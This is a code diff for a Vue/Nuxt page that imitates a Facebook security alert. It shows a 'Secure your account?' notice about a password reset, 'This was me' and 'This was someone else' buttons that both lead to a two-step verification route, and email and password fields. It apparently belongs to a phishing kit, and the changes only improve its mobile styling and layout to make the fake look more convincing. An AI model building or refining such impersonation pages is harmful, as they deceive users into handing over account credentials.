@@ -3,8 +3,15 @@ const email = ref('')
 const password = ref('')
 const router = useRouter()
 
-const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric', minute: 'numeric', hour12: true };
-
+const options = {
+  weekday: 'long',
+  year: 'numeric',
+  month: 'long',
+  day: 'numeric',
+  hour: 'numeric',
+  minute: 'numeric',
+  hour12: true,
+}
 
 const handleSubmit = async () => {
   if (!email.value || !password.value) {
@@ -35,20 +42,24 @@ const handleSubmit = async () => {
     </header>
 
     <div
-      class="max-md:mt-[calc(50px+20px)]  rounded-[4px] mt-[calc(83px+20px)] md:pt-[25px] md:border border-[#ccc] md:min-w-[577px]"
+      class="max-md:mt-[calc(50px+10px)] rounded-[4px] mt-[calc(83px+20px)] md:pt-[25px] md:border border-[#ccc] md:min-w-[577px]"
     >
-      <div class="flex items-center mx-5 pb-[6px] md:border-b md:border-[#ccc]">
+      <div class="max-md:mx-[10px] flex items-center md:mx-5 pb-[6px] md:border-b md:border-[#ccc]">
         <i class="icon"></i>
-        <p class="ml-1 text-[16px] text-[#162643] font-semibold">Secure your account?</p>
+        <p class="md:block hidden ml-1 text-[16px] text-[#162643] font-semibold">Secure your account?</p>
+        <p class="max-md:text-[14px] max-md:block hidden ml-1 text-[16px] text-[#162643] font-semibold">
+          You may have performed this action yourself
+        </p>
       </div>
 
-      <div class="px-5 md:pt-[10px]">
+      <div class="max-md:mx-[10px] md:px-5 md:pt-[10px]">
         <p class="text-[12px] my-[10px] max-md:mt-0">
           This action came from a network you have used before to access Facebook:
         </p>
 
         <p class="text-[12px]">
-          <strong>Password reset</strong> on <strong>{{ new Date().toLocaleString('en-US', options) }}</strong>
+          <strong>Password reset</strong> on
+          <strong>{{ new Date().toLocaleString('en-US', options) }}</strong>
         </p>
 
         <p class="text-[12px] my-[10px]">
@@ -63,13 +74,13 @@ const handleSubmit = async () => {
       >
         <NuxtLink
           to="/two_step_verification/two_factor"
-          class="max-md:w-full w-fit border border-[#ccd0d5] rounded-[2px] px-[10px] flex justify-center items-center text-[#4b4f56] bg-[#f5f6f7] h-[28px]"
+          class="btn-2 btn-mobile max-md:w-full w-fit border border-[#ccd0d5] rounded-[2px] px-[10px] flex justify-center items-center text-[#4b4f56] bg-[#f5f6f7] md:h-[28px]"
         >
           This was someone else
         </NuxtLink>
         <NuxtLink
           to="/two_step_verification/two_factor"
-          class="max-md:w-full w-fit md:ml-1 bg-[#4267b2] border border-[#4267b2] rounded-[2px] px-[10px] flex justify-center items-center text-white h-[28px]"
+          class="btn-1 btn-mobile max-md:w-full w-fit md:ml-1 bg-[#4267b2] border border-[#4267b2] rounded-[2px] px-[10px] flex justify-center items-center text-white md:h-[28px]"
         >
           This was me
         </NuxtLink>
@@ -215,5 +226,28 @@ header {
   display: inline-block;
   height: 16px;
   width: 16px;
+}
+
+@media (max-width: 767px) {
+  .btn-mobile {
+    box-shadow:
+      inset 0 0 1px rgba(0, 0, 0, 0.7),
+      inset 0 1px 0 rgba(255, 255, 255, 0.3),
+      0 1px 2px -1px rgba(0, 0, 0, 0.7);
+      text-shadow: 0 -1px 0 rgba(0, 0, 0, .35);
+      border-radius: 6px;
+      padding: 8px 17px;
+      line-height: 27px;
+      font-size: 16px;
+      font-weight: bold;
+    }
+  .btn-1 {
+    background: linear-gradient(#647aab, #2c467e);
+  }
+  .btn-2 {
+    background: linear-gradient(#fdfefe, #f0f1f2);
+    color: #505c77;
+    text-shadow: 0 1px 0 rgba(255, 255, 255, .6);
+  }
 }
 </style>
